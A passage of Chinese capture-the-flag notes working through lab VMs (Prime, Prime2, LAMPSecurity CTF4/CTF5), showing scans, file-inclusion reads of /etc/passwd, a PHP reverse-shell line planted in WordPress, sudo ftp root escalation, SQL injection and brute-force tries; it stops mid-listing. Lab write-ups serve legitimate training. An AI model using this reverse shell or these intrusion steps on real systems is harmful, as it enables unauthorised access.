<li><p>访问<a href="http://192.168.0.109/dev%EF%BC%8C%E6%B2%A1%E5%95%A5%E6%9C%89%E7%94%A8%E4%B8%9C%E8%A5%BF">http://192.168.0.109/dev，没啥有用东西</a></p>
</li>
<li><p>dirb <a href="http://192.168.0.109/">http://192.168.0.109</a> -X .txt,.php,.html    找到secret.txt</p>
<ul>
<li><p>Looks like you have got some secrets.</p>
</li>
<li><p>Ok I just want to do some help to you. </p>
</li>
<li><p>Do some more fuzz on every page of php which was finded by you. And if</p>
</li>
<li><p>you get any right parameter then follow the below steps. If you still stuck </p>
</li>
<li><p>Learn from here a basic tool with good usage for OSCP.</p>
</li>
<li><p><a href="https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</a></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>wfuzz -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt   <a href="http://192.168.0.109/index.php?FUZZ">http://192.168.0.109/index.php?FUZZ</a></p>
</li>
<li><p>wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;wfuzz&#x2F;wordlist&#x2F;general&#x2F;common.txt  –hc 404 –hw 12  <a href="http://192.168.0.109/index.php?FUZZ">http://192.168.0.109/index.php?FUZZ</a></p>
</li>
<li><p>然后得到进一步信息<img src="https://api2.mubu.com/v3/document_image/2ae0ad8b-8f04-4551-a6bb-e9a3a8af50ff-18494357.jpg" alt="img"></p>
</li>
<li><p>发现可以文件读取：<a href="http://192.168.0.109/image.php?file=location.txt&secrettier360=/etc/passwd">http://192.168.0.109/image.php?file=location.txt&amp;secrettier360=/etc/passwd</a> ，saket:x:1001:1001:find password.txt file in my directory:&#x2F;home&#x2F;saket:</p>
</li>
<li><p>访问 &#x2F;home&#x2F;saket&#x2F;password.txt,得到victor密码，进入wordpress管理界面</p>
</li>
<li><p><a href="http://192.168.0.109/wordpress/wp-admin/index.php">http://192.168.0.109/wordpress/wp-admin/index.php</a></p>
</li>
<li><p>编辑一个界面：<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.229.128/1234 0>&1'"); ?></p>
</li>
<li><p>访问<img src="https://api2.mubu.com/v3/document_image/528c58e1-5263-4eb4-ae71-af44a8627176-18494357.jpg" alt="img"></p>
</li>
<li><p>whoami，uname -a，lsb-release，cat &#x2F;etc&#x2F;cron*</p>
</li>
<li><p>内核提权：searchsploit ubuntu 4.10 | grep “Pri” </p>
</li>
<li><p>找个c文件编译</p>
</li>
<li><p>python -c ‘import pty; pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
</li>
<li><p>上传文件</p>
<ul>
<li><p>nc上传</p>
<ul>
<li><p>www-data：nc -lp 4444 &gt; 45010.c</p>
</li>
<li><p>发送端：nc 192.168.0.109 4444  &lt; 45010.c</p>
</li>
<li><p>成功<img src="https://api2.mubu.com/v3/document_image/399f870a-9404-4e31-bb1b-e95c40014fc7-18494357.jpg" alt="img"></p>
</li>
</ul>
</li>
<li><p>开php服务上传</p>
<ul>
<li><p>php  -S  host:port  -t &#x2F;www,php -S 0:1234 -t  phpserver  </p>
</li>
<li><p>wget <a href="http://192.168.0.107:1234/45010.c">http://192.168.0.107:1234/45010.c</a></p>
</li>
<li><p>ok</p>
</li>
<li></li>
</ul>
</li>
<li><p>metasploit 直接upload</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="prime2"><a href="#prime2" class="headerlink" title="prime2"></a>prime2</h2><ul>
<li><p>主机探测信息收集</p>
<ul>
<li><p>ip a，namp -sn 192.168.1.0&#x2F;24，nmap –min-rate 10000 192.168.1.40  ,sudo nmap -sT  -sV -O  192.168.1.40 ,sudo nmap -sU -sV -O  192.168.1.40 </p>
<ul>
<li><p>PORT    STATE SERVICE     VERSION</p>
</li>
<li><p>22&#x2F;tcp  open  ssh         OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)</p>
</li>
<li><p>80&#x2F;tcp  open  http        Apache httpd 2.4.46 ((Ubuntu))</p>
</li>
<li><p>139&#x2F;tcp open  netbios-ssn Samba smbd 4.6.2</p>
</li>
<li><p>445&#x2F;tcp open  netbios-ssn Samba smbd 4.6.2</p>
</li>
<li><p>10123</p>
</li>
<li><p>MAC Address: 00:0C:29:25:DB:31 (VMware)</p>
</li>
<li><p>Device type: general purpose</p>
</li>
<li><p>Running: Linux 4.X|5.X</p>
</li>
<li><p>OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5</p>
</li>
<li><p>OS details: Linux 4.15 - 5.6</p>
</li>
<li><p>Network Distance: 1 hop</p>
</li>
<li><p>Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</p>
</li>
</ul>
</li>
<li><p>nmap –script&#x3D;vuln -p 22,80,139,445 192.168.1.40  </p>
<ul>
<li><p>┌──(kali㉿kali)-[~&#x2F;Desktop]</p>
</li>
<li><p>└─$ nmap –script&#x3D;vuln -p 22,80,139,445 192.168.1.40                                                                                                                                                                                                                                      130 ⨯</p>
</li>
<li><p>Starting Nmap 7.93 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2023-02-07 20:56 EST</p>
</li>
<li><p>Stats: 0:00:31 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan</p>
</li>
<li><p>NSE Timing: About 50.00% done; ETC: 20:58 (0:00:32 remaining)</p>
</li>
<li><p>Pre-scan script results:</p>
</li>
<li><p>| broadcast-avahi-dos: </p>
</li>
<li><p>|   Discovered hosts:</p>
</li>
<li><p>|     224.0.0.251</p>
</li>
<li><p>|   After NULL UDP avahi packet DoS (CVE-2011-1002).</p>
</li>
<li><p>|_  Hosts are all up (not vulnerable).</p>
</li>
<li><p>Nmap scan report for 192.168.1.40</p>
</li>
<li><p>Host is up (0.00035s latency).</p>
</li>
<li><p>PORT    STATE SERVICE</p>
</li>
<li><p>22&#x2F;tcp  open  ssh</p>
</li>
<li><p>80&#x2F;tcp  open  http</p>
</li>
<li><p>| http-enum: </p>
</li>
<li><p>|   &#x2F;css&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
</li>
<li><p>|   &#x2F;images&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
</li>
<li><p>|_  &#x2F;server&#x2F;: Potentially interesting directory w&#x2F; listing on ‘apache&#x2F;2.4.46 (ubuntu)’</p>
</li>
<li><p>|_http-csrf: Couldn’t find any CSRF vulnerabilities.</p>
</li>
<li><p>|_http-stored-xss: Couldn’t find any stored XSS vulnerabilities.</p>
</li>
<li><p>|_http-dombased-xss: Couldn’t find any DOM based XSS.</p>
</li>
<li><p>139&#x2F;tcp open  netbios-ssn</p>
</li>
<li><p>445&#x2F;tcp open  microsoft-ds</p>
</li>
<li><p>10123</p>
</li>
<li><p>Host script results:</p>
</li>
<li><p>|_smb-vuln-ms10-054: false</p>
</li>
<li><p>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]</p>
</li>
<li><p>|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR: Server returned less data than it was supposed to (one or more fields are missing); aborting [9]</p>
</li>
<li><p>Nmap done: 1 IP address (1 host up) scanned in 66.34 seconds</p>
</li>
</ul>
</li>
<li><p>端口探测：</p>
<ul>
<li><p>80端口：</p>
<ul>
<li><p>nikto -url <a href="http://192.168.1.40/">http://192.168.1.40</a></p>
<ul>
<li><p>- Nikto v2.1.6</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Target IP:          192.168.1.40</p>
</li>
<li><p>+ Target Hostname:    192.168.1.40</p>
</li>
<li><p>+ Target Port:        80</p>
</li>
<li><p>+ Start Time:         2023-02-07 21:01:32 (GMT-5)</p>
</li>
<li><p>-————————————————————————–</p>
</li>
<li><p>+ Server: Apache&#x2F;2.4.46 (Ubuntu)</p>
</li>
<li><p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
</li>
<li><p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
</li>
<li><p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
</li>
<li><p>+ No CGI Directories found (use ‘-C all’ to force check all possible dirs)</p>
</li>
<li><p>+ Server may leak inodes via ETags, header found with file &#x2F;, inode: 1681, size: 5c1cb40b7dd57, mtime: gzip</p>
</li>
<li><p>+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS </p>
</li>
<li><p>+ OSVDB-3268: &#x2F;server&#x2F;: Directory indexing found.</p>
</li>
<li><p>+ &#x2F;server&#x2F;: Possibly Macromedia JRun or CRX WebDAV upload</p>
</li>
<li><p>+ OSVDB-3268: &#x2F;css&#x2F;: Directory indexing found.</p>
</li>
<li><p>+ OSVDB-3092: &#x2F;css&#x2F;: This might be interesting…</p>
</li>
<li><p>+ OSVDB-3268: &#x2F;images&#x2F;: Directory indexing found.</p>
</li>
<li><p>+ 7916 requests: 0 error(s) and 10 item(s) reported on remote host</p>
</li>
<li><p>+ End Time:           2023-02-07 21:02:23 (GMT-5) (51 seconds)</p>
</li>
</ul>
</li>
<li><p>访问&#x2F;server，看到文件下载下来之后在分析<img src="https://api2.mubu.com/v3/document_image/3018fe38-5ae7-4baf-84c8-b2f9f9e8c785-18494357.jpg" alt="img"></p>
</li>
<li><p>wpscan –url 192.168.1.40&#x2F;wp -e    </p>
<ul>
<li>得到admin</li>
</ul>
</li>
</ul>
</li>
<li><p>10123：</p>
<ul>
<li><p>wget下载目录文件：wget -r -np -nH -R index.html <a href="http://url/including/files/you/want/to/download/">http://url/including/files/you/want/to/download/</a></p>
</li>
<li><p>发现一个shell文件，盲猜之后要利用</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="lampCTF4"><a href="#lampCTF4" class="headerlink" title="lampCTF4"></a>lampCTF4</h2><h3 id="自己："><a href="#自己：" class="headerlink" title="自己："></a>自己：</h3><p>得到目标IP</p>
<p>访问web服务</p>
<p>访问blog：<a href="http://192.168.222.142/index.html?page=blog&title=Blog&id=2">http://192.168.222.142/index.html?page=blog&amp;title=Blog&amp;id=2</a></p>
<p>看到id&#x3D;2，怀疑有sql注入，输入引号，还真有，sqlmap能一把梭</p>
<p>得到用户名密码。</p>
<p>ssh：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh 192.168.222.142                                                              </span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line"></span><br><span class="line">问下gpt，还挺厉害</span><br><span class="line">怎样解决：ssh 192.168.222.142                                                              </span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1</span><br><span class="line">这个问题是由于你的SSH客户端和远程服务器在密钥交换方法上不匹配。目前，远程服务器提供的密钥交换方法包括 diffie-hellman-group-exchange-sha1、diffie-hellman-group14-sha1 和 diffie-hellman-group1-sha1。这些方法可能已被视为不安全或已被弃用。</span><br><span class="line">为了解决这个问题，你可以尝试以下几种方法：</span><br><span class="line">更新你的SSH客户端到最新版本。这样，你的客户端可能会支持更安全的密钥交换方法。在Linux或macOS系统上，你可以通过运行以下命令来更新：</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br><span class="line">在macOS上，如果你使用Homebrew安装了OpenSSH，可以运行：</span><br><span class="line">brew update</span><br><span class="line">brew upgrade openssh</span><br><span class="line">如果你无法更新SSH客户端，或者更新后仍然出现问题，你可以尝试临时修改SSH客户端配置以接受远程服务器提供的密钥交换方法。在命令行中运行以下命令：</span><br><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 user@192.168.222.142</span><br><span class="line">这将允许SSH客户端在本次会话中使用这些方法。请注意，这可能会降低安全性。</span><br><span class="line">另一种解决方案是更新远程服务器的SSH服务器配置，以支持更安全的密钥交换方法。这需要在服务器上编辑/etc/ssh/sshd_config文件，并添加或修改以下行：</span><br><span class="line">KexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256</span><br><span class="line">保存文件后，重启SSH服务器：</span><br><span class="line">sudo systemctl restart ssh</span><br><span class="line">这样，远程服务器将支持更安全的密钥交换方法。请确保在尝试此方法之前，你有远程服务器的管理员权限。</span><br><span class="line"></span><br><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 dstevens@192.168.222.142</span><br><span class="line">Unable to negotiate with 192.168.222.142 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss</span><br><span class="line">回答：</span><br><span class="line">这个问题是因为SSH客户端与远程服务器在主机密钥类型上不匹配。目前，远程服务器提供的主机密钥类型包括ssh-rsa和ssh-dss，这些类型可能已被视为不安全或已被弃用。</span><br><span class="line"></span><br><span class="line">要解决此问题，你可以尝试以下方法：</span><br><span class="line">临时修改SSH客户端配置以接受远程服务器提供的主机密钥类型。在命令行中运行以下命令：</span><br><span class="line">ssh -oHostKeyAlgorithms=+ssh-rsa,ssh-dss user@192.168.222.142</span><br><span class="line">这将允许SSH客户端在本次会话中使用这些主机密钥类型。请注意，这可能会降低安全性。</span><br><span class="line"></span><br><span class="line">更新远程服务器的SSH服务器配置以支持更安全的主机密钥类型。这需要在服务器上编辑/etc/ssh/sshd_config文件，并添加或修改以下行：</span><br><span class="line">HostKeyAlgorithms ssh-ed25519,ssh-rsa,ssh-dss</span><br><span class="line">同时，请确保在/etc/ssh/目录下生成对应的新主机密钥（如果尚未生成）：</span><br><span class="line"></span><br><span class="line">sudo ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N &#x27;&#x27;</span><br><span class="line">保存文件后，重启SSH服务器：</span><br><span class="line"></span><br><span class="line">sudo systemctl restart ssh</span><br><span class="line">这样，远程服务器将支持更安全的主机密钥类型。请确保在尝试此方法之前，你有远程服务器的管理员权限。</span><br><span class="line">如果以上方法都无法解决问题，你可以考虑更新你的SSH客户端到最新版本，以支持更安全的主机密钥类型。请参考之前的回答中关于如何更新SSH客户端的说明。</span><br></pre></td></tr></table></figure>

<p>解决：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  -oHostKeyAlgorithms=+ssh-rsa,ssh-dss  dstevens@192.168.222.142</span><br><span class="line">The authenticity of host &#x27;192.168.222.142 (192.168.222.142)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.222.142&#x27; (RSA) to the list of known hosts.</span><br><span class="line">BSD SSH 4.1</span><br><span class="line">dstevens@192.168.222.142&#x27;s password: </span><br><span class="line">Last login: Wed Mar 11 09:45:34 2009</span><br><span class="line">[dstevens@ctf4 ~]$ ftp</span><br><span class="line">ftp&gt; !ls</span><br><span class="line">Desktop  html  install.log  mail  software</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">dstevens</span><br><span class="line">ftp&gt; !/bin/bash</span><br><span class="line">[dstevens@ctf4 ~]$ sudo ftp</span><br><span class="line">Password:</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">root</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<p>这个是遇到的最简单的了，主要难度还是ssh登录的配置</p>
<h2 id="lampCTF5"><a href="#lampCTF5" class="headerlink" title="lampCTF5"></a>lampCTF5</h2><p>扫描发现服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo nmap -sN -sV -O   -p22,25,80,110,111,139,143,445,901,3306  192.168.222.143</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:55 EDT</span><br><span class="line">Nmap scan report for 192.168.222.143</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp        Sendmail 8.14.1/8.14.1</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))</span><br><span class="line">110/tcp  open  pop3        ipop3d 2006k.101</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">901/tcp  open  http        Samba SWAT administration server</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.45</span><br><span class="line">MAC Address: 00:0C:29:DC:88:B2 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Hosts: localhost.localdomain, 192.168.222.143; OS: Unix</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo nmap --script=vuln -p22,25,80,110,111,139,143,445,901,3306  192.168.222.138</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:12 EDT</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap done: 1 IP address (0 hosts up) scanned in 35.81 seconds</span><br></pre></td></tr></table></figure>

<p>信息收集：</p>
<p>22试下能ssh爆破不（一般不太行，ladon跑，干其他事情）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Start: 2023-04-12 20:21:51</span><br><span class="line">PC Name: PENETRATION Lang: zh-CN</span><br><span class="line">Runtime: .net 4.0  ME: x64 OS: x64</span><br><span class="line">Found: Runtime .net 4.8.4084.0</span><br><span class="line">OS Name: Microsoft Windows 10 专业工作站版</span><br><span class="line">Machine Make: VMware, Inc.</span><br><span class="line">Network: IS Connected</span><br><span class="line">RunUser: Anonymous PR: -IsUser</span><br><span class="line">PID: 5624  CurrentProcess: Ladon911</span><br><span class="line">CPU: Physical: 2 Cores: 4 Logical: 4</span><br><span class="line">FreeSpace: Disk C:\ 76398 MB</span><br><span class="line"></span><br><span class="line">Threads: 80</span><br><span class="line">Not Found PassWord File,Use DefaultPwd</span><br><span class="line">load SshScan</span><br><span class="line">_ICMP: 192.168.222.132  00-0C-29-F7-4D-E0       VMware</span><br><span class="line">192.168.222.132 22      Close</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2023-04-12 20:21:56</span><br></pre></td></tr></table></figure>

<p>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ ssh -oKexAlgorithms&#x3D;+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  -oHostKeyAlgorithms&#x3D;+ssh-rsa,ssh-dss <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#50;&#x32;&#50;&#46;&#49;&#52;&#51;">&#114;&#x6f;&#x6f;&#116;&#x40;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#50;&#x32;&#50;&#46;&#49;&#52;&#51;</a><br>The authenticity of host ‘192.168.222.143 (192.168.222.143)’ can’t be established.<br>RSA key fingerprint is SHA256:my5mjHup9LZ8CG0KCcvRNwYyvbuVrZI5nfKF7N1XjcU.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes<br>Warning: Permanently added ‘192.168.222.143’ (RSA) to the list of known hosts.<br><a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#50;&#x32;&#x32;&#46;&#49;&#52;&#x33;">&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#50;&#x32;&#x32;&#46;&#49;&#52;&#x33;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#50;&#50;&#50;&#46;&#x31;&#x34;&#x33;">&#114;&#111;&#x6f;&#x74;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#46;&#50;&#50;&#50;&#46;&#x31;&#x34;&#x33;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#50;&#50;&#46;&#49;&#x34;&#x33;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#x31;&#x39;&#x32;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#50;&#50;&#46;&#49;&#x34;&#x33;</a>‘s password: </p>
<p>看看能不能在哪个地方得到用户名</p>
<p>3306看也能爆破一下不</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FreeSpace: Disk C:\ 76398 MB</span><br><span class="line"></span><br><span class="line">Threads: 80</span><br><span class="line">Not Found PassWord File,Only Scan Mysql Port!</span><br><span class="line">load MysqlScan</span><br><span class="line">_ICMP: 192.168.222.132  00-0C-29-F7-4D-E0       VMware</span><br><span class="line">192.168.222.132 3306    Close</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2023-04-12 20:22:43</span><br></pre></td></tr></table></figure>

<p>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ mysql -h 192.168.222.143 -u root -p123456                                                      1 ⨯<br>ERROR 1045 (28000): Access denied for user ‘root‘@’192.168.222.132’ (using password: YES)</p>
<p>看80，25不知道干嘛的之后在管</p>
<p>80：</p>
<p>使用nikto+dirb</p>
<h2 id="┌──-kali㉿kali-x2F-Desktop-└─-nikto-url-http-192-168-222-143-Nikto-v2-1-6"><a href="#┌──-kali㉿kali-x2F-Desktop-└─-nikto-url-http-192-168-222-143-Nikto-v2-1-6" class="headerlink" title="┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ nikto -url  http://192.168.222.143- Nikto v2.1.6"></a>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ nikto -url  <a href="http://192.168.222.143/">http://192.168.222.143</a><br>- Nikto v2.1.6</h2><ul>
<li>Target IP:          192.168.222.143</li>
<li>Target Hostname:    192.168.222.143</li>
<li>Target Port:        80</li>
<li>Start Time:         2023-04-12 08:28:41 (GMT-4)</li>
</ul>
<hr>
<ul>
<li>Server: Apache&#x2F;2.2.6 (Fedora)</li>
<li>Retrieved x-powered-by header: PHP&#x2F;5.2.4</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
<li>Apache&#x2F;2.2.6 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</li>
<li>Allowed HTTP Methods: <strong>GET, HEAD, POST, OPTIONS, TRACE</strong> </li>
<li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.</li>
<li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</li>
<li>&#x2F;index.php: PHP include error may indicate local or remote file inclusion is possible.</li>
<li>OSVDB-12184: &#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: &#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: &#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-3092: <strong>&#x2F;phpmyadmin&#x2F;changelog.php</strong>: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>Server may leak inodes via ETags, header found with file &#x2F;phpmyadmin&#x2F;ChangeLog, inode: 558008, size: 22676, mtime: Mon Aug 20 22:59:12 2029</li>
<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>Cookie SQMSESSID created without the httponly flag</li>
<li>OSVDB-3093: &#x2F;mail&#x2F;src&#x2F;read_body.php: SquirrelMail found</li>
<li>OSVDB-3093: &#x2F;squirrelmail&#x2F;src&#x2F;read_body.php: SquirrelMail found</li>
<li>&#x2F;info.php: Output from the phpinfo() function was found.</li>
<li>OSVDB-3233: &#x2F;info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</li>
<li>OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</li>
<li>OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</li>
<li>OSVDB-5292: <strong>&#x2F;info.php</strong>?file&#x3D;<a href="http://cirt.net/rfiinc.txt">http://cirt.net/rfiinc.txt</a>?: RFI from RSnake’s list (<a href="http://ha.ckers.org/weird/rfi-locations.dat">http://ha.ckers.org/weird/rfi-locations.dat</a>) or from <a href="http://osvdb.org/">http://osvdb.org/</a> （<strong>phinfo界面，有敏感信息但没用</strong></li>
<li>&#x2F;phpmyadmin&#x2F;: phpMyAdmin directory found</li>
<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>8724 requests: 0 error(s) and 26 item(s) reported on remote host</li>
<li>End Time:           2023-04-12 08:29:06 (GMT-4) (25 seconds)</li>
</ul>
<hr>
<ul>
<li>1 host(s) tested</li>
</ul>
<p>三个地方登录注册：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录</span><br><span class="line">http://192.168.222.143/phpmyadmin/ （sql试了g</span><br><span class="line">http://192.168.222.143/mail/src/login.php （很卡这个</span><br><span class="line">/events/?q=node&amp;destination=node  （sql试了g</span><br><span class="line"></span><br><span class="line">注册</span><br><span class="line">http://192.168.222.143/list/</span><br><span class="line">[21:45:58] [WARNING] information_schema not available, back-end DBMS is MySQL &lt; 5. database names will be fetched from &#x27;mysql&#x27; database</span><br><span class="line">[21:45:58] [INFO] retrieved: &#x27;test&#x27;</span><br><span class="line">[21:45:58] [INFO] retrieved: &#x27;test\\_%&#x27;</span><br><span class="line">有sql注入但没东西，寄</span><br></pre></td></tr></table></figure>

<p>感觉phpadmin是突破点，一个一个试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DIRECTORY: http://192.168.222.143/phpmyadmin/contrib/                                             </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                 </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/index.php (CODE:200|SIZE:8457)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/js/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/lang/                                                </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/libraries (CODE:403|SIZE:302)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/LICENSE (CODE:200|SIZE:18011)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/phpinfo.php (CODE:200|SIZE:0)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/README (CODE:200|SIZE:2624)                                       </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/robots.txt (CODE:200|SIZE:26)                                     </span><br><span class="line">==&gt; DIRECTORY: 